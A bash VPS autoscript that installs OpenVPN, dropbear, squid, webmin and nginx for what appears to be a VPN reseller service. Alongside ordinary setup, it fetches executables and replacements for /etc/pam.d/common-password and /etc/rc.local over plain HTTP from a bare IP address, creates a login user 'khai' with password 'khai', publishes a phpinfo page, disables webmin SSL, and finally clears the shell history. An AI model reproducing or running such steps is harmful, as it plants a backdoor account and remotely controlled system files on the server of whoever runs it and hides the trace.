#!/bin/bash
# ******************************************
# Program: Autoscript Setup VPS 2017
# Website: bm86.ml
# Developer: Batah Marayau
# Nickname: BM
# Date: 11-05-2016
# Last Updated: 05-08-2017
# ******************************************
# START SCRIPT ( guardeumvpn.tk )
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
if [ $USER != 'root' ]; then
echo "Sorry, for run the script please using root user"
exit 1
fi
if [[ "$EUID" -ne 0 ]]; then
echo "Sorry, you need to run this as root"
exit 2
fi
if [[ ! -e /dev/net/tun ]]; then
echo "TUN is not available"
exit 3
fi
echo "
AUTOSCRIPT BY KHAI

PLEASE CANCEL ALL PACKAGE POPUP

TAKE NOTE !!!"
clear
echo "START AUTOSCRIPT"
clear
echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "
ENABLE IPV4 AND IPV6

COMPLETE 1%
"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear
echo "
REMOVE SPAM PACKAGE

COMPLETE 10%
"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
echo "
UPDATE AND UPGRADE PROCESS

PLEASE WAIT TAKE TIME 1-5 MINUTE
"
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
apt-get update;
apt-get -y autoremove;
apt-get -y install wget curl;
echo "
INSTALLER PROCESS PLEASE WAIT

TAKE TIME 5-10 MINUTE
"
# script
wget -O /usr/local/bin/menu "http://45.32.114.217/file/menu"
wget -O /usr/local/bin/autokill "http://45.32.114.217/file/autokill"
wget -O /usr/local/bin/user-generate "http://45.32.114.217/file/user-generate"
wget -O /usr/local/bin/speedtest "http://45.32.114.217/file/speedtest"
wget -O /usr/local/bin/user-lock "http://45.32.114.217/file/user-lock"
wget -O /usr/local/bin/user-unlock "http://45.32.114.217/file/user-unlock"
wget -O /usr/local/bin/auto-reboot "http://45.32.114.217/file/auto-reboot"
wget -O /usr/local/bin/user-password "http://45.32.114.217/file/user-password"
wget -O /usr/local/bin/trial "http://45.32.114.217/file/trial"
wget -O /etc/pam.d/common-password "http://45.32.114.217/file/common-password"
chmod +x /etc/pam.d/common-password
chmod +x /usr/local/bin/menu 
chmod +x /usr/local/bin/autokill 
chmod +x /usr/local/bin/user-generate 
chmod +x /usr/local/bin/speedtest 
chmod +x /usr/local/bin/user-unlock
chmod +x /usr/local/bin/user-lock
chmod +x /usr/local/bin/auto-reboot
chmod +x /usr/local/bin/user-password
chmod +x /usr/local/bin/trial
# fail2ban & exim & protection
apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
cd ddos-deflate-master && ./install.sh
service exim4 stop;sysv-rc-conf exim4 off;
# webmin
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
# ssh
sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
wget -O /etc/issue.net "http://45.32.114.217/file/banner"
# dropbear
apt-get -y install dropbear
wget -O /etc/default/dropbear "http://45.32.114.217/file/dropbear"
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
# squid3
apt-get -y install squid3
wget -O /etc/squid3/squid.conf "http://45.32.114.217/file/squid.conf"
wget -O /etc/squid/squid.conf "http://45.32.114.217/file/squid.conf"
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget http://45.32.114.217/file/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local "http://45.32.114.217/file/rc.local"
chmod +x /etc/rc.local
#wget -O /etc/iptables.up.rules "http://45.32.114.217/file/iptables.up.rules"
#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
#iptables-restore < /etc/iptables.up.rules
# nginx
apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/php/7.0/fpm/pool.d/www.conf "http://45.32.114.217/file/www.conf"
mkdir -p /home/vps/public_html
echo "<pre>Setup By KHAI → Call, Whatsapp, Telegram : @guardeumvpn </pre>" > /home/vps/public_html/index.php
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf "http://45.32.114.217/file/vps.conf"
sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
# etc
wget -O /home/vps/public_html/client.ovpn "http://45.32.114.217/file/client.ovpn"
wget -O /etc/motd "http://45.32.114.217/file/motd"
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
useradd -m -g users -s /bin/bash khai
echo "khai:khai" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear
# restart service
service ssh restart
service openvpn restart
service dropbear restart
service nginx restart
service php7.0-fpm restart
service webmin restart
service squid3 restart
service fail2ban restart
clear
# END SCRIPT ( guardeumvpn.tk )
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript VPS (guardeumvpn.tk)"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo "Powered By KHAI → Call, Whatsapp, Telegram : @guardeumvpn"  | tee -a log-install.txt
echo "nginx : http://$myip:80"   | tee -a log-install.txt
echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
echo "OpenVPN  : TCP 1194 (client config : http://$myip/client.ovpn)"  | tee -a log-install.txt
echo "Squid3 : 8080"  | tee -a log-install.txt
echo "OpenSSH : 22"  | tee -a log-install.txt
echo "Dropbear : 443"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "AntiDDOS : [on]"  | tee -a log-install.txt
echo "AntiTorrent : [on]"  | tee -a log-install.txt
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
echo "Menu : Type "menu" To Check Menu Script"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"
echo "LOG INSTALL  --> /root/log-install.txt"
echo "----------------------------------------"
echo "========================================"  | tee -a log-install.txt
echo "      PLEASE REBOOT TAKE EFFECT !"
echo "========================================"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
